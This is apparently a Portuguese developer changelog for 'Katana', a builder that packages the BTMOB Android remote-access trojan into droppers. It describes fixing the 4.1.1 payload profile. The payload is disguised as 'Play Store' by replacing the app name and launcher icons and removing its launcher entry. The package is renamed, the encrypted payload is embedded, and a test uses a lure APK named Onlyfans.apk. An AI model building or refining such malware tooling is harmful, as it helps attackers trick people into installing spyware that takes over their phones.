# BTMOB 4.1.1 — correção do perfil de payload

## Contexto

O commit `0ac9817` (`implementation BTMOB V4.1`) adicionou um perfil `btmob_guid` baseado no rótulo **GUID** do tip do painel RAT, em vez da versão real **BTMOB 4.1.1**.

## O que estava errado

| Ponto | Problema |
|-------|----------|
| Id `btmob_guid` / mensagem “GUID” | Confundia opção de build GUID com versão 4.1.1 |
| Detecção só por `@string/app_name` | Heurística genérica (quase todo APK Android tem `app_name`) |
| Branding | Só alterava `strings.xml`; a UI 4.1.1 lê `assets/app_name.txt` |
| Fallback de ícone | Criava em `res/drawable/`, mas o manifest usa `@mipmap/ic_launcher` |

Perfis **3.6** (`BaseName`) e **4.5.x** (`my_app_name`) não eram o alvo do bug; a lógica deles foi mantida.

## Correção

Perfil: `btmob_411`

**Detecção (após 4.5.x e 3.6):**

- tem `app_name`
- não tem `my_app_name` nem `BaseName`
- existe `assets/app_name.txt`

**Prepare:**

- label em `res/values*/strings.xml` → `app_name`
- grava `assets/app_name.txt` com o nome Play Store
- substitui `ic_launcher.png` / `ic_launcher_round.png` nos `mipmap-*`
- se não houver ícones, fallback em `res/mipmap-hdpi/` (não `drawable`)

## Verificação

`app-test/Onlyfans.apk` → fluxo completo (`start_build`):

- `prepare_payload` → `btmob_411`, LAUNCHER removido, `app_name` + `assets/app_name.txt` = `Play Store`, ícones mipmap = ícone Play Store
- dropper final (`OnlyTest.apk`) → `app_name` customizado, package renomeado, launch `…MainActivity` ligado, asset cifrado do payload presente
- bind do dropper usa o `package` lido no decode do `prepare_payload` (sem reextrair via heurística AXML / `com.android.*`)

## Nota de produto

No tip do painel, “GUID” continua a ser a **opção de build** indicada ao utilizador no RAT. No código Katana o perfil correspondente é **`btmob_411` (BTMOB 4.1.1)**.
